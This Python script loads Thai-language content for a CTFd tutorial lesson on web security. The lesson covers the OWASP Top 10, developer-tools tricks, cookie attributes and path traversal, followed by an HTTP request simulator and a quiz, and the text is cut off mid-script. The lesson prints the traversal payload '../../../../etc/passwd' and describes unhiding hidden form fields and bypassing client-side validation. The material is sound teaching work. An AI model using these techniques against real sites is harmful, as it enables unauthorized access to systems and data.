import json
from CTFd import create_app
from CTFd.plugins.tutorials import TutorialLesson

app = create_app()
ctx = app.app_context()
ctx.push()
db = app.db

def save_lesson(lid, val0, val1, val2):
    l = db.session.query(TutorialLesson).filter_by(id=lid).first()
    blocks = [
        {"type": "markdown", "value": val0},
        {"type": "markdown", "value": val1},
        {"type": "markdown", "value": val2}
    ]
    l.content = json.dumps(blocks, ensure_ascii=False)
    db.session.query(TutorialLesson).filter_by(id=lid).update({"content": l.content})
    db.session.commit()
    print(f"Lesson {lid} successfully upgraded!")

# ─── Lesson 177: Web Application Security & OWASP ───
val177_0 = """## 🌐 Web Application Security & OWASP (สถาปัตยกรรมเว็บแอปและความรู้เบื้องต้น)
---

ยินดีต้อนรับสู่บทเรียนสถาปัตยกรรมเว็บแอปและความเข้าใจเชิงความมั่นคงปลอดภัยตามมาตรฐาน OWASP

### 📄 SLIDE 1-3: ภาพรวมวิทยาการการโจมตีเว็บ (Web Exploitations)
- **Web Exploitation**: หมายถึงกระบวนการค้นหา วิเคราะห์ และการใช้ประโยชน์จากช่องโหว่ความมั่นคงปลอดภัยในแอปพลิเคชันเว็บ เพื่อเข้าถึงข้อมูลโดยไม่ได้รับอนุญาต (Unauthorized Access), ดึงสารสนเทศที่เป็นความลับ หรือครอบครองสิทธิ์การเข้าถึงระบบควบคุมเซิร์ฟเวอร์หลังบ้าน
- เป็นแกนหลักที่สำคัญมากในสายงานความปลอดภัยไซเบอร์ โดยเฉพาะอย่างยิ่งในการทำงานด้าน **การเจาะระบบแบบมีคุณธรรม (Ethical Hacking)** และ **การทดสอบเจาะระบบ (Penetration Testing)**

---

### 📄 SLIDE 4-8: มาตรฐานความเสี่ยง OWASP Top 10
- **OWASP Top 10**: เป็นเอกสารรายงานเชิงความมั่นคงสากลที่ชี้เป้า 10 อันดับความเสี่ยงสูงสุดที่เป็นอันตรายต่อแอปพลิเคชันเว็บ โดยจัดทำและเผยแพร่โดยองค์กรไม่แสวงหากำไร **Open Web Application Security Project (OWASP)** เพื่อให้นักพัฒนาและผู้ดูแลระบบนำไปตั้งรับและแก้ไข
- การปรับปรุงมาตรฐานเกิดขึ้นเป็นรอบปี โดยมีรุ่นแก้ไขสำคัญ ได้แก่ รุ่น 2003 (รุ่นแรก), 2004, 2007, 2010, 2013, 2017, 2021 และรุ่นล่าสุดในปัจจุบัน **(OWASP Top 10 Release 2025/2026)**

---

### 📄 SLIDE 9-28: รายละเอียดช่องโหว่ OWASP Top 10 (A01 - A10)

#### 🛡️ A01:2025 - Broken Access Control
- **คำจำกัดความ**: เกิดขึ้นเมื่อระบบไม่บังคับการควบคุมสิทธิ์อย่างถูกต้อง ทำให้ผู้ใช้ธรรมดาสามารถข้ามไปดึงข้อมูลหรือเข้าถึงฟังก์ชันระดับสูงที่ตนเองไม่มีสิทธิ์ใช้งาน
- **ผลกระทบ**: นำไปสู่การเข้าถึง แก้ไข หรือลบข้อมูลสำคัญโดยมิชอบ
- **ตัวอย่าง**:
  - การแอบเข้าถึงหน้าจัดการแอดมินหลังบ้านตรงๆ โดยไม่ผ่านการล็อกอิน (เช่น พิมพ์เข้าทาง `/admin` หรือ `/dashboard` ตรงๆ)
  - การเปลี่ยนตัวเลขพารามิเตอร์เพื่อเข้าดูข้อมูลผู้ใช้อื่น เช่น เปลี่ยน URL จาก `/profile/view/12345` เป็น `/profile/view/12346`
  - การปลอมแปลงค่า JSON Web Token (JWT) เพื่อยกระดับสิทธิ์ตัวเอง

#### 🛡️ A02:2025 - Security Misconfiguration
- **คำจำกัดความ**: เกิดขึ้นจากการกำหนดสิทธิ์และการตั้งค่าความปลอดภัยของแอปพลิเคชัน เซิร์ฟเวอร์ หรือฐานข้อมูลไม่รัดกุมเพียงพอ
- **ตัวอย่าง**:
  - การปล่อยบัญชีและรหัสผ่านเริ่มต้นของระบบไว้ เช่น `admin:admin` หรือ `root:root`
  - การเปิดสิทธิ์การเข้าถึงสารบัญโฟลเดอร์แบบดิบ (Directory Listing Enabled) เช่น พิมพ์เข้าเว็บแล้วเห็นรายการไฟล์ใน `/var/www/html/` ทั้งหมด
  - การปล่อยให้เปิดใช้งานระบบดีบั๊กในโหมด Production ทำให้หน้าเว็บแสดงรหัสผ่านหรือ stack trace ยาวเหยียดเมื่อระบบเอเรอร์

#### 🛡️ A03:2025 - Software Supply Chain Failures
- **คำจำกัดความ**: ความเสี่ยงจากการใช้ไลบรารี สัญญาภายนอก หรือซอร์สโค้ดเฟรมเวิร์กของผู้พัฒนาอื่นมาพัฒนาเว็บแอปพลิเคชัน ซึ่งผู้สืบทอดไม่ได้ตรวจสอบสิทธิ์และถูกโจมตีแฝงมัลแวร์
- **ตัวอย่าง**: การเรียกใช้งาน NPM, Pip หรือ Composer package ที่ถูกแฮกเกอร์แอบอัปเดตเวอร์ชันใหม่ประสงค์ร้ายเพื่อส่งขโมยตัวแปรระบบ (.env) ออกไป

#### 🛡️ A04:2025 - Cryptographic Failures
- **คำจำกัดความ**: ความเสี่ยงที่เกิดจากการใช้กลไกเข้ารหัสที่ไม่รัดกุม หรือความบกพร่องในการปกป้องข้อมูลที่เป็นความลับ
- **ตัวอย่าง**:
  - การเก็บรหัสผ่านผู้เรียนในฐานข้อมูลเป็นข้อความธรรมดา (Plaintext) แทนที่จะคำนวณแฮช
  - การประยุกต์ใช้อัลกอริทึมเข้ารหัสโบราณที่มีลูปชนกันง่าย เช่น MD5, SHA-1 หรือกุญแจเข้ารหัสลับขนาดเล็กเกินไป

#### 🛡️ A05:2025 - Injection (SQLi, XSS, Command Injection)
- **คำจำกัดความ**: การที่ระบบนำข้อมูลอินพุตจากผู้ใช้ไปรวมเข้าเป็นคำสั่งประมวลผลระบบหลังบ้านโดยไม่มีการคัดกรองอักขระพิเศษออกไปก่อน
- **ตัวอย่าง**:
  - **SQL Injection**: การแทรกคำสั่งคิวรีเพื่อดึงข้อมูลทั้งหมดจากฐานข้อมูล
  - **Cross-Site Scripting (XSS)**: การฝังแทรกสคริปต์ JavaScript ประสงค์ร้ายเข้ามาทำงานในบราวเซอร์ผู้ใช้
  - **Command Injection**: การแทรกคำสั่ง Command Line เพื่อควบคุมสั่งการเซิร์ฟเวอร์ตรงๆ

#### 🛡️ A06:2025 - Insecure Design
- **คำจำกัดความ**: ช่องโหว่จากการวางโครงสร้างสถาปัตยกรรมและตรรกะระบบตั้งแต่เริ่มออกแบบโดยไม่มีการจำลองภัยคุกคาม (Threat Modeling)
- **ตัวอย่าง**: ระบบยอมให้แก้ไขรหัสผ่านได้ทันทีโดยไม่ต้องกรอกรหัสผ่านเก่า เพื่อยืนยันตัวตน หรือการไม่มีฟังก์ชัน Rate Limiting ป้องกันการเดารหัสผ่านซ้ำๆ

#### 🛡️ A07:2025 - Authentication Failures
- **คำจำกัดความ**: ความบกพร่องของระบบตรวจรับและอนุญาตสิทธิ์การล็อกอินเข้าใช้งานระบบ
- **ตัวอย่าง**: ระบบยอมรับรหัสผ่านที่สั้นและคาดเดาง่าย เช่น `123456` หรือการไม่มีระบบ Account Lockout เพื่อสั่งล็อกผู้ใช้งานชั่วคราวเมื่อเดารหัสผิดเกินกำหนด

#### 🛡️ A08:2025 - Software and Data Integrity Failures
- **คำจำกัดความ**: ความบกพร่องในการทบทวนความถูกต้องของตัวติดตั้ง การอัปเดตระบบ หรือโครงสร้างข้อมูลแบบ serialize
- **ตัวอย่าง**: การปล่อยให้ผู้ใช้ส่งข้อมูล serialize object ที่ปรับเปลี่ยนสิทธิ์เข้าไปทำงานโดยไม่ตรวจสอบ signature ความปลอดภัยก่อน

#### 🛡️ A09:2025 - Security Logging and Monitoring Failures
- **คำจำกัดความ**: การไม่ได้ตั้งค่าจัดทำบันทึกประวัติการใช้สิทธิ์ (Log Files) หรือระบบแจ้งเตือนเมื่อเกิดกรณีการยิงแทรกคำสั่งผิดปกติ
- **ตัวอย่าง**: ระบบโดนทดสอบยิงรหัสผ่านล็อกอินเป็นหมื่นครั้ง แต่ไม่มีประวัติล็อกใดๆ บันทึกขึ้น ทำให้แฮกเกอร์โจมตีได้อย่างยาวนานโดยไม่ถูกตรวจพบ

#### 🛡️ A10:2025 - Mishandling of Exceptional Conditions
- **คำจำกัดความ**: ระบบจัดการกับสถานการณ์เอเรอร์ที่คาดเดาไม่ได้อย่างหละหลวม ส่งผลให้ข้ามขั้นตอนการยืนยันตัวตนหรืออนุญาตสิทธิ์เข้าถึงระบบไปอย่างง่ายดาย

---

### 📄 SLIDE 29-41: Web Page Source Inspections (F12 Developer Tools)
การแกะรหัสหน้าเว็บ (Inspect Elements) ช่วยให้นักทดสอบเจาะระบบและนักพัฒนาเข้าใจการทำงานของเว็บ:
- **ปุ่มลัดการเรียกใช้งาน**: กด `F12` หรือ `Ctrl + Shift + I` (Windows), `Cmd + Option + I` (Mac)
- **การดูซอร์สโค้ดดิบ (View Page Source)**: กด `Ctrl + U` (Windows) หรือคลิกขวาแล้วเลือก "ดูซอร์สโค้ดหน้าเว็บ"
- **การดัดแปลง HTML สด (Modifying HTML)**:
  - ช่วยให้นักโจมตีตรวจสอบ input ของแบบฟอร์มที่ถูกซ่อนอยู่ เช่น การเปลี่ยน `type="hidden"` เป็น `type="text"` เพื่อแสดงกล่องป้อนข้อมูลลับบนหน้าเว็บที่โปรแกรมเมอร์ซ่อนไว้
- **การดัดแปลง CSS (Modifying CSS)**:
  - การแอบดูและแก้ไขสไตล์หน้าเว็บสดเพื่อดึงข้อมูลที่ถูกปิดซ่อนผ่านสไตล์ความปลอดภัยหลวมๆ (เช่น ลบสไตล์ `display: none;` ของหน้าต่างล็อกสิทธิ์ทิ้ง)
- **การดีบั๊ก JavaScript (Debugging JS)**:
  - การวิเคราะห์สคริปต์ใน Sources tab และใส่ Breakpoint เพื่อหยุดพักตัวแปร ช่วยในการข้ามขั้นตอนยืนยันสิทธิ์ฝั่งผู้ใช้งาน (Client-Side Validation Bypass)

---

### 📄 SLIDE 42-45: Web Cookies Explorations
- **HTTP Cookies**: บล็อกข้อมูลขนาดเล็กที่เว็บเซิร์ฟเวอร์ส่งมาเก็บบันทึกบนบราวเซอร์ของผู้ใช้เพื่อใช้รักษาสถานะล็อกอิน (Session)
- **สเปกฟิลด์คุกกี้ที่สำคัญ (Cookie Attributes)**:
  - **HttpOnly**: มีความสำคัญสูงมากในการปิดกั้นไม่ให้โค้ด JavaScript (ผ่านคำสั่ง `document.cookie`) เข้าถึงตัวคุกกี้ได้ ช่วยลดทอนภัยคุกคามจากการขโมยเซสชันผ่านช่องโหว่ XSS
  - **Secure**: บังคับให้ส่งคุกกี้เฉพาะกรณีการรันผ่านช่องทางปลอดภัย HTTPS เท่านั้น
  - **SameSite**: ป้องกันการจู่โจมข้ามค่ายเชิงปลอมแปลงคำสั่ง (CSRF)

---

### 📄 SLIDE 46-50: Path and Directory Traversal
- **Directory Traversal**: ช่องโหว่ที่ช่วยให้แฮกเกอร์ใช้ประโยชน์จากช่องอินพุตประเภทอ้างอิงตำแหน่งไฟล์ ขยับขยับตำแหน่งออกจากรากเว็บบอร์ดขึ้นมาดึงไฟล์สำคัญของระบบ เช่น `../../../../etc/passwd`
- **Robots.txt**: เป็นเอกสารข้อกำหนดที่นักพัฒนาใส่ไว้ในเว็บเพื่อห้ามบอต (Search Engine) มาดึงข้อมูลหน้าเพจที่เป็นความลับ แต่แฮกเกอร์มักเปิดดูไฟล์นี้เพื่อค้นหาที่ตั้งของแผงแอดมินหรือแบ็คอัปฐานข้อมูลได้ทันที"""

val177_1 = """### 💻 HTTP Headers Diagnostic Sandbox (จำลองวิเคราะห์โครงสร้างข้อมูลเว็บ)

คลิกหัวข้อด้านซ้ายมือเพื่อจำลองวิเคราะห์โครงสร้าง และ **กดปุ่มรันจำลองการทำงานจริง (Run Simulation)** เพื่อตรวจสอบทราฟฟิกข้อมูล:

<style type="text/css">
.w-sandbox-main { display: flex !important; gap: 20px !important; margin: 1.5rem auto !important; max-width: 1000px !important; }
.w-sandbox-nav { width: 220px !important; display: flex !important; flex-direction: column !important; gap: 8px !important; flex-shrink: 0 !important; }
.w-nav-item { background: rgba(255, 255, 255, 0.02) !important; border: 1px solid rgba(255, 255, 255, 0.06) !important; border-radius: 6px !important; padding: 10px 14px !important; color: #cbd5e1 !important; text-align: left !important; cursor: pointer !important; font-size: 0.78rem !important; transition: all 0.2s !important; }
.w-nav-item:hover, .w-nav-item.active { border-color: #00f0ff !important; color: #ffffff !important; background: rgba(0, 240, 255, 0.05) !important; }
.w-nav-item.active { font-weight: 700 !important; box-shadow: 0 0 8px rgba(0, 240, 255, 0.15) !important; }
.w-sandbox-panels { flex-grow: 1 !important; display: flex !important; flex-direction: column !important; gap: 14px !important; }
.w-sand-panel { display: none; background: #05070f !important; border: 1px solid rgba(255, 255, 255, 0.08) !important; border-radius: 10px !important; padding: 20px !important; box-shadow: 0 8px 24px rgba(0,0,0,0.45) !important; }
.w-sand-panel.active { display: block !important; }
</style>
<div class="w-sandbox-main" style="display: flex; gap: 20px; margin: 1.5rem auto; max-width: 1000px;">
<div class="w-sandbox-nav" style="width: 220px; display: flex; flex-direction: column; gap: 8px; flex-shrink: 0;">
<button id="nav-item-httpget" class="w-nav-item active" style="background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.06); border-radius: 6px; padding: 10px 14px; color: #cbd5e1; text-align: left; cursor: pointer; font-size: 0.78rem; transition: all 0.2s;" onclick="showSandboxItem('httpget', this)">1. Send HTTP GET</button>
<button id="nav-item-httppost" class="w-nav-item" style="background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.06); border-radius: 6px; padding: 10px 14px; color: #cbd5e1; text-align: left; cursor: pointer; font-size: 0.78rem; transition: all 0.2s;" onclick="showSandboxItem('httppost', this)">2. Send HTTP POST</button>
</div>
<div class="w-sandbox-panels" style="flex-grow: 1; display: flex; flex-direction: column; gap: 14px;">
<div id="panel-httpget" class="w-sand-panel active" style="background: #05070f; border: 1px solid rgba(255, 255, 255, 0.08) !important; border-radius: 10px !important; padding: 20px !important; box-shadow: 0 8px 24px rgba(0,0,0,0.45) !important;">
<div style="font-size: 0.95rem; font-weight: 800; color: #ffffff; border-bottom: 1px solid rgba(255,255,255,0.06); padding-bottom: 10px; margin-bottom: 14px; display: flex; justify-content: space-between; align-items: center;">
<span>1. HTTP GET Request Method</span>
<span style="font-size: 0.65rem; padding: 2px 8px; border-radius: 4px; background: rgba(0,240,255,0.08); border: 1px solid rgba(0,240,255,0.2); color: #00f0ff; font-family: monospace;">HTTP Client</span>
</div>
<pre style="font-family: monospace; font-size: 0.8rem; color: #00f0ff; white-space: pre-wrap; margin: 0 0 12px; background: rgba(0,0,0,0.2); padding: 14px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.02);">GET /index.php HTTP/1.1
Host: ctf.rpca.ac.th
User-Agent: Mozilla/5.0
Accept: text/html
Cookie: session_id=abc123xyz</pre>
<div style="background: #02040a; border: 1px solid rgba(255,255,255,0.06); border-radius: 8px; margin-bottom: 16px; overflow: hidden;">
<div style="background: rgba(255,255,255,0.03); padding: 6px 12px; border-bottom: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-between; align-items: center;">
<span style="font-size: 0.65rem; color: #64748b; font-weight: 800; letter-spacing: 0.06em; font-family: monospace;">🐚 Terminal Console</span>
<button style="background: rgba(0,240,255,0.1); border: 1px solid rgba(0,240,255,0.3); border-radius: 4px; color: #00f0ff; font-size: 0.68rem; padding: 3px 8px; cursor: pointer; font-family: monospace; font-weight: 700; transition: all 0.15s;" onclick="startWebSim('httpget')">▶ Run Simulation</button>
</div>
<div id="term-httpget" style="font-family: monospace; font-size: 0.76rem; color: #a7f3d0; padding: 12px 16px; white-space: pre-wrap; min-height: 90px;">
<span style="color: #3ddc84;">client$</span> [กดปุ่ม Run Simulation เพื่อส่ง Request]
</div>
</div>
<div style="background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.05); border-radius: 8px; padding: 16px; font-size: 0.83rem; color: #cbd5e1; line-height: 1.65;">
<h5 style="margin: 0 0 8px; font-size: 0.85rem; color: #fbbf24; font-weight: bold;">⚙️ Command Description</h5>
<p style="margin: 0;">เมธอด GET ใช้เพื่อดึงหน้าเพจขึ้นมาแสดงผล โดยบราวเซอร์ส่ง Cookie ยืนยันสิทธิ์เซสชันแอดมิน</p>
</div>
</div>
<div id="panel-httppost" class="w-sand-panel" style="background: #05070f; border: 1px solid rgba(255, 255, 255, 0.08) !important; border-radius: 10px !important; padding: 20px !important; box-shadow: 0 8px 24px rgba(0,0,0,0.45) !important; display: none;">
<div style="font-size: 0.95rem; font-weight: 800; color: #ffffff; border-bottom: 1px solid rgba(255,255,255,0.06); padding-bottom: 10px; margin-bottom: 14px; display: flex; justify-content: space-between; align-items: center;">
<span>2. HTTP POST Request Method</span>
<span style="font-size: 0.65rem; padding: 2px 8px; border-radius: 4px; background: rgba(0,240,255,0.08); border: 1px solid rgba(0,240,255,0.2); color: #00f0ff; font-family: monospace;">HTTP Client</span>
</div>
<pre style="font-family: monospace; font-size: 0.8rem; color: #00f0ff; white-space: pre-wrap; margin: 0 0 12px; background: rgba(0,0,0,0.2); padding: 14px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.02);">POST /login.php HTTP/1.1
Host: ctf.rpca.ac.th
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=admin&password=secret</pre>
<div style="background: #02040a; border: 1px solid rgba(255,255,255,0.06); border-radius: 8px; margin-bottom: 16px; overflow: hidden;">
<div style="background: rgba(255,255,255,0.03); padding: 6px 12px; border-bottom: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-between; align-items: center;">
<span style="font-size: 0.65rem; color: #64748b; font-weight: 800; letter-spacing: 0.06em; font-family: monospace;">🐚 Terminal Console</span>
<button style="background: rgba(0,240,255,0.1); border: 1px solid rgba(0,240,255,0.3); border-radius: 4px; color: #00f0ff; font-size: 0.68rem; padding: 3px 8px; cursor: pointer; font-family: monospace; font-weight: 700; transition: all 0.15s;" onclick="startWebSim('httppost')">▶ Run Simulation</button>
</div>
<div id="term-httppost" style="font-family: monospace; font-size: 0.76rem; color: #a7f3d0; padding: 12px 16px; white-space: pre-wrap; min-height: 90px;">
<span style="color: #3ddc84;">client$</span> [กดปุ่ม Run Simulation เพื่อส่ง Request]
</div>
</div>
<div style="background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 8px; padding: 16px; font-size: 0.83rem; color: #cbd5e1; line-height: 1.65;">
<h5 style="margin: 0 0 8px; font-size: 0.85rem; color: #fbbf24; font-weight: bold;">⚙️ Command Description</h5>
<p style="margin: 0;">เมธอด POST ใช้เพื่อส่งข้อมูลชุดใหญ่ที่เป็นความลับ (เช่น รหัสผ่าน) ไปประมวลผลบนเซิร์ฟเวอร์โดยไม่โชว์บน URL</p>
</div>
</div>
</div>
</div>
<script>
window.showSandboxItem = function(itemKey, element) {
  const navButtons = document.querySelectorAll('.w-sandbox-nav button');
  navButtons.forEach(btn => {
    btn.style.borderColor = 'rgba(255, 255, 255, 0.06)';
    btn.style.color = '#cbd5e1';
    btn.style.background = 'rgba(255, 255, 255, 0.02)';
  });
  element.style.borderColor = '#00f0ff';
  element.style.color = '#ffffff';
  element.style.background = 'rgba(0, 240, 255, 0.05)';
  const panels = document.querySelectorAll('.w-sand-panel');
  panels.forEach(p => { p.style.display = 'none'; });
  const target = document.getElementById('panel-' + itemKey);
  if (target) { target.style.display = 'block'; }
}
window.startWebSim = function(itemKey) {
  const term = document.getElementById('term-' + itemKey);
  if (!term) return;
  term.innerHTML = '<span style="color:#64748b;">client$</span> <span style="color:#ffffff; font-weight:bold;">Sending HTTP Request...</span>\\n[.] Accessing remote port 80/443\\n[.] Reading Response Headers...';
  setTimeout(() => {
    if (itemKey === 'httpget') {
      term.innerHTML = '<span style="color:#64748b;">client$</span> <span style="color:#3ddc84; font-weight:bold;">HTTP/1.1 200 OK</span>\\nServer: Apache/2.4.41 (Ubuntu)\\nContent-Type: text/html\\nContent-Length: 1042\\n\\n&lt;html&gt;&lt;body&gt;&lt;h1&gt;Welcome to RPCA Cyber Club&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;';
    } else if (itemKey === 'httppost') {
      term.innerHTML = '<span style="color:#64748b;">client$</span> <span style="color:#fbbf24; font-weight:bold;">HTTP/1.1 302 Found</span>\\nServer: Apache/2.4.41 (Ubuntu)\\nLocation: /dashboard.php\\nSet-Cookie: session_id=abc123xyz; Path=/; HttpOnly\\n\\n[+] Redirecting to dashboard...';
    }
  }, 1000);
}
</script>"""

val177_2 = """### ✏️ Lesson Quick Quiz (แบบทดสอบทบทวนความรู้ท้ายบทเรียน)

ตอบคำถามประเมินความรู้ 2 ข้อด้านล่างนี้ให้ถูกต้องครบถ้วนเพื่อทำการผ่านบทเรียนย่อยนี้ (Lesson Clear):

<style>
.mini-quiz-box{width:100%;max-width:1050px;margin:2rem auto;background:rgba(15,17,26,0.45);border:1px solid rgba(255,255,255,0.06);border-radius:12px;padding:24px;box-shadow:0 8px 32px rgba(0,0,0,0.3);box-sizing:border-box;}
.mq-layout-container {display:flex; gap:24px; align-items:stretch;}
.mq-questions-col {flex:1;}
.mq-gauge-col {width:160px; display:flex; flex-direction:column; align-items:center; justify-content:center; border-left:1px solid rgba(255,255,255,0.06); padding-left:24px;}
@media (max-width: 768px) {
  .mq-layout-container {flex-direction:column;}
  .mq-gauge-col {width:100%; border-left:none; padding-left:0; border-top:1px solid rgba(255,255,255,0.06); padding-top:24px;}
}
.neon-gauge-container {position:relative; width:120px; height:120px;}
.neon-gauge {width:100%; height:100%;}
.neon-gauge-bg {fill:none; stroke:rgba(255,255,255,0.05); stroke-width:2.8;}
.neon-gauge-fill {fill:none; stroke:url(#gauge-grad-177); stroke-width:2.8; stroke-linecap:round; transition:stroke-dasharray 0.5s ease; filter:drop-shadow(0 0 5px rgba(0,240,255,0.4));}
.neon-gauge-text {fill:#ffffff; font-family:'JetBrains Mono',monospace; font-size:9px; font-weight:800; text-anchor:middle; filter:drop-shadow(0 0 2px rgba(255,255,255,0.3));}

.mq-q{margin-bottom:20px;}
.mq-title{font-size:0.9rem;font-weight:800;color:#e2e8f0;margin-bottom:10px;}
.mq-title span{color:#00f0ff;font-family:'JetBrains Mono',monospace;margin-right:6px;}
.mini-opts{display:flex;flex-direction:column;gap:6px;}
.mini-opt{display:flex;align-items:center;gap:10px;padding:10px 14px;background:rgba(255,255,255,0.015);border:1px solid rgba(255,255,255,0.05);border-radius:8px;cursor:pointer;transition:all 0.15s ease;user-select:none;font-size:0.83rem;color:#cbd5e1;}
.mini-opt:hover{border-color:rgba(0,240,255,0.2);background:rgba(0,240,255,0.02);}
.mini-opt.selected{border-color:#00f0ff;background:rgba(0,240,255,0.08);color:#ffffff;}
.mini-opt.correct{border-color:#3ddc84;background:rgba(61,220,132,0.08);color:#ffffff;}
.mini-opt.incorrect{border-color:#ff007f;background:rgba(255,0,127,0.08);color:#ffffff;}
.mini-bullet{width:15px;height:15px;border:1px solid rgba(255,255,255,0.3);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:0.58rem;font-weight:bold;}
.mini-opt.selected .mini-bullet{border-color:#00f0ff;background:#00f0ff;color:#070910;}

.mq-btn-check{padding:10px 20px;background:#00f0ff;border:none;border-radius:6px;font-family:'JetBrains Mono',monospace;font-size:0.82rem;font-weight:800;color:#070910;cursor:pointer;box-shadow:0 0 10px rgba(0,240,255,0.25);transition:all 0.15s ease;}
.mq-btn-check:hover{background:#ffffff;box-shadow:0 0 15px rgba(255,255,255,0.4);transform:translateY(-1px);}
.mq-status-bar{display:none;padding:12px 16px;border-radius:8px;font-size:0.85rem;margin-top:16px;font-weight:700;line-height:1.5;}
</style>

<div id="mq-box-177" class="mini-quiz-box">
<div class="mq-layout-container">
<div class="mq-questions-col">
<!-- Question 1 -->
<div class="mq-q" data-correct="B">
<div class="mq-title"><span>Q1.</span> พอร์ตบริการเครือข่ายมาตรฐานสำหรับการเข้าถึงหน้าเว็บเพจแบบเข้ารหัสปลอดภัย (HTTPS) คือพอร์ตใด?</div>
<div class="mini-opts">
<div class="mini-opt" data-val="A"><span class="mini-bullet">A</span> Port 80</div>
<div class="mini-opt" data-val="B"><span class="mini-bullet">B</span> Port 443 (HTTPS)</div>
<div class="mini-opt" data-val="C"><span class="mini-bullet">C</span> Port 22</div>
<div class="mini-opt" data-val="D"><span class="mini-bullet">D</span> Port 8080</div>
</div>
</div>

<!-- Question 2 -->
<div class="mq-q" data-correct="B">
<div class="mq-title"><span>Q2.</span> โครงการมาตรฐานสากลด้านความปลอดภัยเว็บที่จัดอันดับ 10 ความเสี่ยงสูงสุดของเว็บแอปพลิเคชันคือองค์กรใด?</div>
<div class="mini-opts">
<div class="mini-opt" data-val="A"><span class="mini-bullet">A</span> W3C</div>
<div class="mini-opt" data-val="B"><span class="mini-bullet">B</span> OWASP</div>
<div class="mini-opt" data-val="C"><span class="mini-bullet">C</span> SANS Institute</div>
<div class="mini-opt" data-val="D"><span class="mini-bullet">D</span> MITRE Corporation</div>
</div>
</div>

<button class="mq-btn-check" onclick="checkMiniQuiz177(177)">Check Answers / ตรวจคำตอบ</button>
<div id="mq-status-177" class="mq-status-bar"></div>
</div>

<div class="mq-gauge-col">
  <span class="text-muted d-block mb-3" style="font-size:0.75rem; text-transform:uppercase; letter-spacing:0.1em; text-align:center;">Lesson Progress</span>
  <div class="neon-gauge-container">
    <svg class="neon-gauge" viewBox="0 0 36 36">
      <defs>
        <linearGradient id="gauge-grad-177" x1="0%" y1="0%" x2="100%" y2="100%">
          <stop offset="0%" stop-color="#ff007f" />
          <stop offset="50%" stop-color="#fbbf24" />
          <stop offset="100%" stop-color="#00f0ff" />
        </linearGradient>
      </defs>
      <path class="neon-gauge-bg" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" />
      <path class="neon-gauge-fill" id="lesson-gauge-fill-177" stroke-dasharray="0, 100" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" />
      <text x="18" y="20.35" class="neon-gauge-text" id="lesson-gauge-text-177">0%</text>
    </svg>
  </div>
  <span id="lesson-status-txt-177" class="mt-3 d-block text-muted" style="font-size:0.78rem; text-align:center;">โปรดตอบคำถามให้ครบ 2 ข้อ</span>
</div>
</div>
</div>

<script>
document.querySelectorAll('#mq-box-177 .mini-opt').forEach(function(opt) {
  opt.addEventListener('click', function() {
    var parent = this.closest('.mq-q');
    parent.querySelectorAll('.mini-opt').forEach(function(o) { o.classList.remove('selected'); });
    this.classList.add('selected');
    updateMiniProgress177(177);
  });
});

function updateMiniProgress177(lnum) {
  var box = document.getElementById('mq-box-' + lnum);
  var qGroups = box.querySelectorAll('.mq-q');
  var answeredCount = 0;
  qGroups.forEach(function(g) {
    if (g.querySelector('.mini-opt.selected')) {
      answeredCount++;
    }
  });
  var pct = Math.round((answeredCount / qGroups.length) * 100);
  var fill = document.getElementById('lesson-gauge-fill-' + lnum);
  var text = document.getElementById('lesson-gauge-text-' + lnum);
  var status = document.getElementById('lesson-status-txt-' + lnum);
  if (fill) fill.setAttribute('stroke-dasharray', pct + ', 100');
  if (text) text.textContent = pct + '%';
  if (status) {
    if (pct === 100) {
      status.innerHTML = '<span style="color:#00f0ff; font-weight:bold;">กรุณากดตรวจคำตอบ</span>';
    } else if (pct > 0) {
      status.textContent = 'ตอบคำถามแล้ว ' + answeredCount + '/' + qGroups.length + ' ข้อ';
    } else {
      status.textContent = 'โปรดตอบคำถามให้ครบ 2 ข้อ';
    }
  }
}

function checkMiniQuiz177(lnum) {
  var box = document.getElementById('mq-box-' + lnum);
  var groups = box.querySelectorAll('.mq-q');
  var score = 0;
  var allAnswered = true;
  groups.forEach(function(g) {
    if (!g.querySelector('.mini-opt.selected')) allAnswered = false;
  });
  if (!allAnswered) {
    alert("กรุณาตอบคำถามท้ายบทให้ครบถ้วนทั้ง 2 ข้อก่อนส่งตรวจคำตอบครับ!");
    return;
  }
  groups.forEach(function(g) {
    var correctVal = g.getAttribute('data-correct');
    var selected = g.querySelector('.mini-opt.selected');
    var selectedVal = selected.getAttribute('data-val');
    g.querySelectorAll('.mini-opt').forEach(function(o) {
      o.classList.remove('correct', 'incorrect');
      var val = o.getAttribute('data-val');
      if (val === correctVal) {
        o.classList.add('correct');
      } else if (o.classList.contains('selected')) {
        o.classList.add('incorrect');
      }
    });
    if (selectedVal === correctVal) score++;
  });

  var fill = document.getElementById('lesson-gauge-fill-' + lnum);
  var text = document.getElementById('lesson-gauge-text-' + lnum);
  var status_txt = document.getElementById('lesson-status-txt-' + lnum);
  var status = document.getElementById('mq-status-' + lnum);
  status.style.display = 'block';

  if (score === 2) {
    if (fill) { fill.setAttribute('stroke-dasharray', '100, 100'); fill.style.stroke = '#3ddc84'; }
    if (text) text.textContent = '100%';
    if (status_txt) status_txt.innerHTML = '<span style="color:#3ddc84; font-weight:bold;"><i class="fas fa-check-circle mr-1"></i> ปลดล็อกบทเรียนถัดไปแล้ว</span>';
    
    status.style.background = 'rgba(61,220,132,0.08)';
    status.style.border = '1px solid rgba(61,220,132,0.25)';
    status.style.color = '#3ddc84';
    status.innerHTML = '🏆 <strong>LESSON CLEARED!</strong> คุณผ่านการประเมินความรู้ท้ายบทเรียนย่อยนี้เรียบร้อย (คะแนน 2/2) สามารถเดินทางไปศึกษาบทเรียนถัดไปได้ครับ!';
    
    localStorage.setItem('solved_lesson_177', 'solved');
    if (typeof updateProgressUI === 'function') updateProgressUI();
    groups.forEach(function(g) {
